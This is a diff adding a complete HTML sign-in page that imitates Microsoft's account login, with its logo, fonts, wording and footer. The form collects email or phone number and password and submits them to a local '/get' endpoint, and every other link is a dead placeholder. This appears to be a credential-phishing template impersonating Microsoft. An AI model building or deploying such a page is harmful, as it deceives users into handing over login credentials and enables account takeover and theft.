@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #1a1a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            background: #2f2f2f;
+            padding: 44px 40px;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 32px;
+        }
+
+        .logo-icon {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2px;
+            width: 20px;
+            height: 20px;
+        }
+
+        .logo-icon span {
+            width: 100%;
+            height: 100%;
+        }
+
+        .logo-icon span:nth-child(1) { background: #f25022; }
+        .logo-icon span:nth-child(2) { background: #7fba00; }
+        .logo-icon span:nth-child(3) { background: #00a4ef; }
+        .logo-icon span:nth-child(4) { background: #ffb900; }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 400;
+            color: #fff;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #b0b0b0;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .input {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            border: 1px solid #383838;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #fff;
+            background: transparent;
+            outline: none;
+        }
+
+        .input::placeholder {
+            color: #888;
+        }
+
+        .input:focus {
+            border-color: #0078d4;
+        }
+
+        .forgot-link {
+            display: inline-block;
+            color: #4db2ff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            height: 40px;
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background: #106ebe;
+        }
+
+        .create-section {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #b0b0b0;
+            text-align: center;
+        }
+
+        .create-link {
+            color: #4db2ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .create-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 16px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #b0b0b0;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-note {
+            font-size: 11px;
+            color: #777;
+        }
+
+        .footer-note a {
+            color: #4db2ff;
+            text-decoration: none;
+        }
+
+        .footer-note a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 440px) {
+            .card {
+                margin: 0 16px;
+                padding: 32px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">
+        <div class="logo-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <span class="logo-text">Microsoft</span>
+    </div>
+
+    <h1 class="title">Sign in</h1>
+    <p class="subtitle">Use your Microsoft account.</p>
+
+    <form action="/get" id="email-form-step">
+        <div class="form-group">
+            <input type="text" name="email" class="input" placeholder="Email or phone number" required>
+        </div>
+
+        <div class="form-group">
+            <input type="password" name="password" class="input" placeholder="Password" required>
+        </div>
+
+        <a href="#" class="forgot-link">Forgot your username?</a>
+
+        <button type="submit" class="submit-btn">Next</button>
+
+        <p class="create-section">
+            New to Microsoft? <a href="#" class="create-link">Create an account</a>
+        </p>
+    </form>
+</div>
+
+<footer class="footer">
+    <div class="footer-links">
+        <a href="#">Help and feedback</a>
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy and cookies</a>
+    </div>
+    <p class="footer-note">Use private browsing if this is not your device. <a href="#">Learn more</a></p>
+</footer>
+</body>
+</html>
